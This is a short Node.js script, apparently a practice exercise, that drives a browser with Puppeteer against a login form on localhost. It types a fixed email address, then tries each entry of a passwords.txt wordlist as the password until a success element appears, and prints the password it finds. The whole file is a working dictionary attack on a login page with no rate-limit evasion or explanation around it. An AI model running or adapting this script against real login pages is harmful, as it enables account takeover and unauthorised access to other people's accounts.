const puppeteer = require("puppeteer");
const fs = require("fs");
const stream = require("stream");
const Transform = stream.Transform;

(async () => {
  const browser = await puppeteer.launch({
    headless: false,
  });
  const page = await browser.newPage();
  await page.goto("http://localhost:3000");

  await page.waitForTimeout(3000);

  const email = await page.$('#root > div > figure > div > div > form > input:nth-child(2)')
  await email.type('test@gmail.com', { delay: 100})

  const password = await page.$("#root > div > figure > div > div > form > input:nth-child(4)");

  let arr = [];

  let file = fs.readFileSync("passwords.txt", "utf8");
  arr = file.split(/\r?\n/);

  const button = await page.$('#root > div > figure > div > div > form > div > button')
  for (const word of arr) {

    await password.click({ clickCount: 3 });
    await password.type(word)

    if (await page.$('#root > div > figure > div > div > form > div > button') !== null) {
      await button.click()

      if (await page.$('#root > div > figure > span')) {
        console.log(`The password for test@gmail.com was ${word}`)
        break
      }
    }
  }

  await browser.close();
})();
